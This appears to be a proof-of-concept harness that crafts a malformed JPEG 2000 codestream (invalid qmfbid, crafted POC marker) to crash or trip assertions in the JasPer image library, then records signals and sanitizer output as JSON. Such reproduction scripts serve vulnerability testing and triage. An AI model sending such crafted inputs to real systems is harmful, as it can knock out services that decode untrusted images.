#!/usr/bin/env python3
import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


MAX_CAPTURE = 8192


def be16(value):
    return struct.pack(">H", value)


def be32(value):
    return struct.pack(">I", value)


def marker(code, body=b""):
    if body:
        return b"\xff" + bytes([code]) + be16(len(body) + 2) + body
    return b"\xff" + bytes([code])


def build_trigger_jpc():
    siz_body = b"".join(
        [
            be16(0),          # Rsiz
            be32(1),          # Xsiz
            be32(1),          # Ysiz
            be32(0),          # XOsiz
            be32(0),          # YOsiz
            be32(1),          # XTsiz
            be32(1),          # YTsiz
            be32(0),          # XTOsiz
            be32(0),          # YTOsiz
            be16(1),          # Csiz
            b"\x07\x01\x01", # Ssiz, XRsiz, YRsiz
        ]
    )

    com_text = b"Creator: JasPer Version 1.900.12"
    com_body = be16(1) + com_text

    cod_body = b"".join(
        [
            b"\x00",         # Scod
            b"\x00",         # progression order
            be16(1),          # layers
            b"\x00",         # multiple component transform
            b"\x05",         # decomposition levels
            b"\x04\x04",     # code block size exponents
            b"\x00",         # code block style
            b"\x02",         # invalid qmfbid; older JasPer asserts on this
        ]
    )

    qcd_body = bytes.fromhex("4040484850484850484850484850484850")
    sot_body = be16(0) + be32(42) + b"\x00\x01"
    poc_body = bytes.fromhex("004040000000000000000000000000000000")
    tile_data = b"\x80\x80\x80\x80\x80\x80"

    return b"".join(
        [
            marker(0x4F),           # SOC
            marker(0x51, siz_body), # SIZ
            marker(0x64, com_body), # COM
            marker(0x52, cod_body), # COD
            marker(0x5C, qcd_body), # QCD
            marker(0x90, sot_body), # SOT
            marker(0x5D, poc_body), # POC
            marker(0x93),           # SOD
            tile_data,
            marker(0xD9),           # EOC
        ]
    )


def truncate_text(data):
    if data is None:
        data = b""
    if len(data) > MAX_CAPTURE:
        data = data[:MAX_CAPTURE]
    return data.decode("utf-8", errors="replace")


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    sig = -returncode
    try:
        return signal.Signals(sig).name
    except ValueError:
        return "SIG%d" % sig


def make_observable(returncode, sig_name, stdout_text, stderr_text, timed_out, error):
    combined = (stdout_text + "\n" + stderr_text).strip()
    crash_terms = ("Assertion", "assertion", "AddressSanitizer", "runtime error", "SEGV")

    if error:
        return {"kind": "custom", "value": error, "path": None}
    if timed_out:
        return {"kind": "custom", "value": "process timed out", "path": None}
    if sig_name:
        value = (sig_name + ("\n" + combined if combined else "")).strip()
        return {"kind": "crash_trace", "value": value, "path": None}
    if any(term in combined for term in crash_terms):
        return {"kind": "crash_trace", "value": combined, "path": None}
    if stderr_text:
        return {"kind": "stderr", "value": stderr_text.strip(), "path": None}
    if stdout_text:
        return {"kind": "stdout", "value": stdout_text.strip(), "path": None}
    return {"kind": "custom", "value": "no observable output", "path": None}


def run_once(binary, timeout):
    with tempfile.TemporaryDirectory(prefix="jasper-poc-") as tmpdir:
        input_path = os.path.join(tmpdir, "trigger.jpc")
        output_path = os.path.join(tmpdir, "out.pnm")
        with open(input_path, "wb") as f:
            f.write(build_trigger_jpc())

        command = [
            binary,
            "--input",
            input_path,
            "--output",
            output_path,
            "--output-format",
            "pnm",
        ]

        start = time.monotonic()
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        timed_out = False
        try:
            stdout_data, stderr_data = proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            timed_out = True
            proc.kill()
            stdout_data, stderr_data = proc.communicate()
        runtime_ms = int((time.monotonic() - start) * 1000)

        return {
            "command": command,
            "returncode": int(proc.returncode),
            "timed_out": timed_out,
            "runtime_ms": runtime_ms,
            "stdout": truncate_text(stdout_data),
            "stderr": truncate_text(stderr_data),
        }


def emit(result, path):
    data = json.dumps(result, sort_keys=False)
    if path:
        with open(path, "w", encoding="utf-8") as f:
            f.write(data + "\n")
    else:
        print(data)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()

    result = {
        "binary": args.binary,
        "command": [],
        "returncode": -1,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": "", "path": None},
        "error": None,
    }

    try:
        run_result = run_once(args.binary, args.timeout)
        result.update(run_result)
        result["signal"] = signal_name(result["returncode"])
    except Exception as exc:
        result["error"] = "%s: %s" % (exc.__class__.__name__, exc)

    result["observable"] = make_observable(
        result["returncode"],
        result["signal"],
        result["stdout"],
        result["stderr"],
        result["timed_out"],
        result["error"],
    )
    emit(result, args.json_out)


if __name__ == "__main__":
    main()
